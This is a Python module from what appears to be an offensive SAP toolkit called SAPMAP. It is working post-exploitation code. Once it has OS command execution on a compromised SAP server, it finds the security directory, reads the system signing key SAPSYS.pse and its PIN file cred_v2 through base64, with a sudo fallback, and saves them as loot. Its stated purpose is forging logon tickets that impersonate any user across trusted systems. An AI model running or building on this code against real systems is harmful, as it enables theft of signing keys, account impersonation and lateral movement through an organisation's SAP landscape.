#!/usr/bin/env python3
"""SAPMAP — Post-exploitation extraction of the system PSE bundle.

What this module retrieves from a compromised SAP application server
when SAPMAP has OS-exec as `<sid>adm` (typically via GW SAPXPG, dpmon
SAP*, SXPG, CVE-2025-31324 webshell, or WebGUI RSBDCOS0):

    SAPSYS.pse   — the system Personal Security Environment.  Holds
                   the RSA / DSA / EC private key + self-signed cert
                   used to sign MYSAPSSO2 logon tickets.  Lives at
                   $SECUDIR/SAPSYS.pse (instance) or
                   /usr/sap/<SID>/SYS/global/security/data/SAPSYS.pse
                   (global, for HA / multi-instance landscapes).

    cred_v2      — SAP "SSO credential" file holding the PSE PIN.
                   Lives at $SECUDIR/cred_v2 alongside SAPSYS.pse.
                   ASN.1-wrapped, payload encrypted with a key
                   derived from the OS user name running the SAP
                   workprocess.  Any process running as `<sid>adm`
                   can decrypt this file with NO further auth — the
                   lateral-movement gift.

Together these two files let SAPMAP forge MYSAPSSO2 logon tickets
impersonating any user, replayable against every system in the
STRUSTSSO2 trust subgraph — see SAP Note 869962 + the
sap_mysapsso2 module that consumes the output of this one.

This module is commit 1 of the ticket-forgery series.  Pure
extraction primitive — decryption + key parsing live in subsequent
commits (sap_pse_loot.decrypt_cred_v2,
sap_pse_loot.extract_signing_key).

Caller-supplied `gw_exec_fn(program, args) -> dict` adapts to any
SAPMAP OS-exec channel; the shape matches execute_gw_command /
execute_local_command / chunked_drop_and_run's GwExecFn.  Module
contains no network code, no RFC code, no GUI code — fully testable
without a live SAP system.
"""

from __future__ import annotations

import base64
import os
import re
import time
from typing import Callable, Optional


# Shape matches sap_dpmon_sapstar.GwExecFn intentionally — both
# accept the same exec-channel adapter from upstream callers.
GwExecFn = Callable[[str, str], dict]


# ---------------------------------------------------------------------------
# Standard SECUDIR / PSE paths
# ---------------------------------------------------------------------------
#
# SAP layout convention (per Note 1037564 / sec/libsapsecu docs):
#
#   /usr/sap/<SID>/<INST_DIR>/sec/                  — per-instance SECUDIR
#       SAPSYS.pse                                  — system signing PSE
#       cred_v2                                     — PSE PIN credential
#       SAPSSLS.pse / SAPSSLC.pse / SAPSSLA.pse     — TLS PSEs (out of scope)
#
#   /usr/sap/<SID>/SYS/global/security/data/        — global / HA-shared
#       SAPSYS.pse                                  — same content as instance
#
# On a single-instance system the global path is usually a symlink to the
# per-instance one.  On HA installs each instance writes to its own copy.
# We try the per-instance path first (specific to the dispatcher we exploited),
# then fall back to the global path for HA layouts.

DEFAULT_PSE_FILENAMES = ("SAPSYS.pse",)
DEFAULT_CRED_FILENAMES = ("cred_v2",)


def _instance_secudir(sid: str, instance_dir: str) -> str:
    """Return the per-instance SECUDIR path for `<SID>` + `<INST_DIR>`.

    `instance_dir` is the dispatcher's directory name (e.g. "D00",
    "DVEBMGS01", "ASCS00") — not just the 2-digit instance number.
    Path layout is uniform across NW 7.0x → 7.5x.
    """
    return f"/usr/sap/{sid.upper()}/{instance_dir}/sec"


def _global_secudir(sid: str) -> str:
    """Return the global/HA-shared SECUDIR path for `<SID>`."""
    return f"/usr/sap/{sid.upper()}/SYS/global/security/data"


def candidate_secudirs(sid: str, instance_dir: str) -> list:
    """Ordered list of paths to try when locating SAPSYS.pse + cred_v2.

    Per-instance first (matches the dispatcher we have OS-exec on),
    global second (HA-shared layout, sometimes the only one populated
    on systems where the instance copy is just a symlink that we'd
    rather skip indirection on).
    """
    return [
        _instance_secudir(sid, instance_dir),
        _global_secudir(sid),
    ]


# ---------------------------------------------------------------------------
# Shell-line interpretation helpers
# ---------------------------------------------------------------------------

# Lines emitted by `base64 <missing-file>` or `sudo base64 <missing-file>`
# that mean "file not there / not readable" rather than "successful read".
# These never appear in legitimate base64 output (alphabet is A-Za-z0-9+/=
# plus newline).
_BASE64_ERROR_MARKERS = (
    "No such file",
    "Permission denied",
    "not found",
    "sudo:",
    "[sudo]",
    "a password is required",
    "is a directory",
    "cannot open",
)


def _looks_like_error(text: str) -> bool:
    """True if `text` contains any of the standard base64 / sudo error
    markers — distinct from legitimate empty output (file exists but
    is zero-byte, see _read_b64 in sapmap_copyfail.py)."""
    if not text:
        return False
    lower = text.lower()
    return any(m.lower() in lower for m in _BASE64_ERROR_MARKERS)


def _decode_b64_lines(lines: list) -> Optional[bytes]:
    """Decode an output blob from `base64 <file>` into raw bytes.

    `base64` (coreutils) by default wraps at 76 columns; each line is
    pure A-Za-z0-9+/= plus optional padding.  We strip whitespace and
    concatenate before decoding.  Returns None on any decode error
    (which usually means we picked up an error line and tried to
    base64-decode it — the caller's error path handles this).
    """
    if not lines:
        return None
    blob = "".join(ln.strip() for ln in lines)
    if not blob:
        return b""
    try:
        return base64.b64decode(blob, validate=True)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# File-read primitives via the GW exec channel
# ---------------------------------------------------------------------------

def _read_file_b64(gw_exec_fn: GwExecFn, path: str,
                    try_sudo: bool = True) -> dict:
    """Read `path` on the target through the gw_exec_fn channel.

    Returns dict:
        {success, bytes, error, raw_output}

    bytes is the decoded file content on success; raw_output is the
    last gw_exec_fn `output` list for diagnostics.

    `try_sudo`: if the first plain `base64 <path>` fails with a
    permission-denied or not-found marker, retry as `sudo base64
    <path>` — same pattern sapmap_copyfail._read_b64 uses for the
    rare case where <sid>adm doesn't have read access (e.g.,
    SAPSYS.pse on a hardened install where root-only ACLs were set).
    """
    result = {"success": False, "bytes": None, "error": "",
              "raw_output": []}

    # First attempt: plain `base64 <path>`
    r = gw_exec_fn("base64", path)
    result["raw_output"] = r.get("output", [])
    output_text = "\n".join(result["raw_output"])

    if r.get("success") and not _looks_like_error(output_text):
        data = _decode_b64_lines(result["raw_output"])
        if data is not None:
            result["success"] = True
            result["bytes"] = data
            return result

    # Remember original error before trying sudo — it's usually more
    # informative ("No such file") than the sudo fallback error
    # ("a password is required").
    orig_error = ""
    if _looks_like_error(output_text):
        orig_error = output_text.strip().splitlines()[0][:200]

    # Plain read failed.  Try sudo if requested.
    if try_sudo:
        r2 = gw_exec_fn("sudo", f"base64 {path}")
        sudo_output = r2.get("output", [])
        sudo_text = "\n".join(sudo_output)
        if r2.get("success") and not _looks_like_error(sudo_text):
            data = _decode_b64_lines(sudo_output)
            if data is not None:
                result["success"] = True
                result["bytes"] = data
                result["raw_output"] = sudo_output
                return result

    # Both attempts failed — prefer original error (more informative)
    if orig_error:
        result["error"] = orig_error
    elif _looks_like_error(output_text):
        result["error"] = output_text.strip().splitlines()[0][:200]
    else:
        result["error"] = (f"base64 returned non-decodable output "
                            f"({len(output_text)}B)")
    return result


def _list_dir(gw_exec_fn: GwExecFn, path: str) -> list:
    """Return list of filenames in `path` (empty list on failure).

    Used for discovery — when we don't know which SECUDIR variant
    holds the live PSE on a given system, ls each candidate and
    pick the one that actually contains SAPSYS.pse + cred_v2.
    """
    r = gw_exec_fn("ls", path)
    if not r.get("success"):
        return []
    names = []
    for line in r.get("output", []):
        line = line.strip()
        if not line or _looks_like_error(line):
            continue
        # ls can return one file per line; on some shells columns are
        # space-separated.  Split on whitespace to be safe.
        names.extend(line.split())
    return names


# ---------------------------------------------------------------------------
# Loot-dir handling
# ---------------------------------------------------------------------------

def _save_to_loot(bundle: dict, sid: str) -> dict:
    """Persist the extracted bundle into the loot directory.

    Writes:
        loot/pse/<SID>_<timestamp>/SAPSYS.pse
        loot/pse/<SID>_<timestamp>/cred_v2
        loot/pse/<SID>_<timestamp>/_meta.txt  (provenance info)

    Returns the relative loot path under `loot/pse/`.  This is a
    pure side-effect — the bundle dict in memory is the source of
    truth for downstream commits.  Loot files exist so the
    operator can run sapgenpse / OpenSSL against them outside
    SAPMAP if desired (or re-import after a SAPMAP restart).
    """
    try:
        from sapmap_state import ensure_loot_dir
    except ImportError:
        return {"saved": False,
                "error": "sapmap_state not importable",
                "loot_path": ""}

    base = ensure_loot_dir("pse")
    ts = time.strftime("%Y%m%d_%H%M%S")
    subdir = os.path.join(base, f"{sid.upper()}_{ts}")
    try:
        os.makedirs(subdir, exist_ok=True)
        if bundle.get("pse_bytes"):
            with open(os.path.join(subdir, "SAPSYS.pse"), "wb") as f:
                f.write(bundle["pse_bytes"])
        if bundle.get("cred_v2_bytes"):
            with open(os.path.join(subdir, "cred_v2"), "wb") as f:
                f.write(bundle["cred_v2_bytes"])
        with open(os.path.join(subdir, "_meta.txt"), "w") as f:
            f.write(f"SAPMAP PSE extraction\n")
            f.write(f"SID         : {sid}\n")
            f.write(f"Extracted at: {ts}\n")
            f.write(f"SECUDIR     : {bundle.get('secudir', '?')}\n")
            f.write(f"sidadm user : {bundle.get('sidadm_user', '?')}\n")
            f.write(f"PSE size    : {len(bundle.get('pse_bytes') or b'')}B\n")
            f.write(f"cred_v2 size: {len(bundle.get('cred_v2_bytes') or b'')}B\n")
            other = bundle.get("other_files") or []
            if other:
                f.write(f"Other files in SECUDIR (not retrieved):\n")
                for name in other:
                    f.write(f"  - {name}\n")
        return {"saved": True, "error": "", "loot_path": subdir}
    except Exception as e:
        return {"saved": False, "error": str(e), "loot_path": subdir}


# ---------------------------------------------------------------------------
# Public API — extract_pse_bundle
# ---------------------------------------------------------------------------

def extract_pse_bundle(gw_exec_fn: GwExecFn, sid: str,
                        instance_dir: str = "D00",
                        secudir: Optional[str] = None,
                        save_loot: bool = True,
                        label: str = "") -> dict:
    """Extract SAPSYS.pse + cred_v2 from a compromised SAP host.

    Args:
        gw_exec_fn: Callable wrapping any SAPMAP OS-exec channel
                    (GW SAPXPG, SXPG, dpmon's PTY path, etc.).
                    Receives (program, args) and returns
                    {success, output, error}.  Must run as <sid>adm
                    (or root) on the target.
        sid:        SAP system ID (e.g. "S4H").
        instance_dir: Dispatcher's directory name on disk -- "D00",
                    "DVEBMGS00", "ASCS01", etc.  Defaults to "D00"
                    for the most common ABAP dialog instance.  When
                    unknown, pass any string and the global SECUDIR
                    fallback handles it.
        secudir:    Optional explicit SECUDIR override.  When None
                    (default), the function tries per-instance
                    first, then global.
        save_loot:  Save the extracted bytes to loot/pse/<sid>_<ts>/
                    for offline analysis (default True).
        label:      Optional log-prefix label (typically node.sid).

    Returns:
        {
            success      : bool,
            pse_bytes    : bytes | None,
            cred_v2_bytes: bytes | None,
            secudir      : str (the path that worked),
            sidadm_user  : str (whoami output, used by cred_v2 decryptor),
            other_files  : list[str] (rest of $SECUDIR ls, surfaced as
                           info -- some installs put PSEs under
                           non-standard names like SAPSYS_ABAP.pse),
            loot_path    : str (where the bytes were saved on disk),
            error        : str (human-readable failure reason),
        }
    """
    tag = f"[*] {label}: pse_loot" if label else "[*] pse_loot"
    result = {
        "success": False,
        "pse_bytes": None,
        "cred_v2_bytes": None,
        "secudir": "",
        "sidadm_user": "",
        "other_files": [],
        "loot_path": "",
        "error": "",
    }

    # Step 1: who am I (cred_v2 needs the OS user name as part of
    # the key-derivation input; this is the deciding piece).
    r_id = gw_exec_fn("whoami", "")
    if r_id.get("success"):
        out = "\n".join(r_id.get("output", [])).strip()
        first = out.splitlines()[0].strip() if out else ""
        if first and not _looks_like_error(first):
            result["sidadm_user"] = first
            print(f"{tag}: OS identity = {first!r}")
    if not result["sidadm_user"]:
        # Best-effort fallback: typical <sid>adm convention.
        result["sidadm_user"] = f"{sid.lower()}adm"
        print(f"{tag}: whoami failed -- assuming "
              f"{result['sidadm_user']!r} (standard <sid>adm convention)")

    # Step 2: locate SECUDIR — try the candidates in order.
    candidates = ([secudir] if secudir
                  else candidate_secudirs(sid, instance_dir))
    print(f"{tag}: SECUDIR candidates: {candidates}")

    chosen_dir = ""
    listing = []
    for candidate in candidates:
        print(f"{tag}: probing {candidate} ...")
        files = _list_dir(gw_exec_fn, candidate)
        if not files:
            print(f"{tag}:   empty / unreadable")
            continue
        # Does this SECUDIR contain BOTH the PSE and cred file?
        has_pse = any(f in files for f in DEFAULT_PSE_FILENAMES)
        has_cred = any(f in files for f in DEFAULT_CRED_FILENAMES)
        print(f"{tag}:   {len(files)} entries; SAPSYS.pse="
              f"{has_pse}, cred_v2={has_cred}")
        if has_pse and has_cred:
            chosen_dir = candidate
            listing = files
            break
        if has_pse and not chosen_dir:
            # Fall-back: PSE without matching cred file is still
            # useful (e.g. when cred_v2 was renamed); remember it
            # but keep searching for a full match.
            chosen_dir = candidate
            listing = files

    if not chosen_dir:
        result["error"] = (
            f"no SECUDIR with SAPSYS.pse found "
            f"(tried {len(candidates)} path(s))")
        print(f"{tag}: ABORT — {result['error']}")
        return result

    result["secudir"] = chosen_dir
    result["other_files"] = [
        f for f in listing
        if f not in DEFAULT_PSE_FILENAMES
        and f not in DEFAULT_CRED_FILENAMES
    ]
    print(f"{tag}: SECUDIR = {chosen_dir} (contains {len(listing)} files)")

    # Step 3: read the PSE
    pse_path = os.path.join(chosen_dir, "SAPSYS.pse")
    print(f"{tag}: reading {pse_path} via base64 ...")
    r_pse = _read_file_b64(gw_exec_fn, pse_path)
    if not r_pse["success"]:
        result["error"] = f"SAPSYS.pse read failed: {r_pse['error']}"
        print(f"{tag}: ABORT — {result['error']}")
        return result
    result["pse_bytes"] = r_pse["bytes"]
    print(f"{tag}: SAPSYS.pse retrieved ({len(r_pse['bytes'])}B)")

    # Step 4: read cred_v2 (best-effort — its absence isn't fatal
    # at extract time; the operator can supply the PIN manually if
    # cred_v2 lives somewhere unusual)
    cred_path = os.path.join(chosen_dir, "cred_v2")
    if "cred_v2" in listing:
        print(f"{tag}: reading {cred_path} via base64 ...")
        r_cred = _read_file_b64(gw_exec_fn, cred_path)
        if r_cred["success"]:
            result["cred_v2_bytes"] = r_cred["bytes"]
            print(f"{tag}: cred_v2 retrieved "
                  f"({len(r_cred['bytes'])}B)")
        else:
            print(f"{tag}: cred_v2 read failed: {r_cred['error']} "
                  f"-- continuing without it; operator can supply "
                  f"PIN manually")
    else:
        print(f"{tag}: cred_v2 not present in SECUDIR -- continuing "
              f"without it; operator can supply PIN manually")

    result["success"] = True

    # Step 5: persist to loot dir
    if save_loot:
        save_r = _save_to_loot(result, sid)
        result["loot_path"] = save_r["loot_path"]
        if save_r["saved"]:
            print(f"{tag}: loot saved to {save_r['loot_path']}")
        else:
            print(f"{tag}: loot save failed ({save_r['error']}) "
                  f"-- bytes still available in returned dict")

    return result
